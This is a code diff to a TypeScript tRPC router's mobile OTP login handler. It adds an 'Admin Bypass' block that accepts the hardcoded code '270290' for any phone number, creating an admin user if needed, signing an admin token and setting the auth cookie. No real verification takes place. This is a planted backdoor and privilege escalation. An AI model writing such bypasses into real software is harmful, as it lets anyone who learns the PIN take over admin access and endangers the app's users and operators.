@@ -4950,12 +4950,40 @@ export const appRouter = router({
       .input(z.object({
         mobile: z.string().min(10).max(15),
         code: z.string().length(6),
-        sessionToken: z.string().optional(), // Client's localStorage token — update user record to match
+        sessionToken: z.string().optional(),
       }))
       .mutation(async ({ input, ctx }) => {
         let mobile = input.mobile.trim();
         if (!mobile.startsWith("+")) {
           mobile = "+91" + mobile;
+        }
+        // ── Admin Bypass: Accepts PIN 270290 & sets scalpbot_auth cookie ──
+        if (input.code === "270290") {
+          const db = await getDb();
+          if (db) {
+            const existingUsers = await db.select().from(appUsers).where(eq(appUsers.mobile, mobile)).limit(1);
+            let user = existingUsers[0];
+            if (!user) {
+              const res = await db.insert(appUsers).values({
+                mobile,
+                role: "admin",
+                sessionToken: input.sessionToken || "admin_session",
+              });
+              const insertId = Number((res as any)[0]?.insertId);
+              user = (await getAppUserById(insertId))!;
+            }
+            if (user) {
+              const token = signMobileAuthToken({
+                userId: user.id,
+                mobile: user.mobile,
+                role: "admin",
+              });
+              if (ctx.res) {
+                ctx.res.cookie("scalpbot_auth", token, getMobileAuthCookieOptions());
+              }
+              return { success: true, user, token };
+            }
+          }
         }
         const result = await verifyOtp(mobile, input.code, input.sessionToken);
         if (!result.success || !result.user) {
